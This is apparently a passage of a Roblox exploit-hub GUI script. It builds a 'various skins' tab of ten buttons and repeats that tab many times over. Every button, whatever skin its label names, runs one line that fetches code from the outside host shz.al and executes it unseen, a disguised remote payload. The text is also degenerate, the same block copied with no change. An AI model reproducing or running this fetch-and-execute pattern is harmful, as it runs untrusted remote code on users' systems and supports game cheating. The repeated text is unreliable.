    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})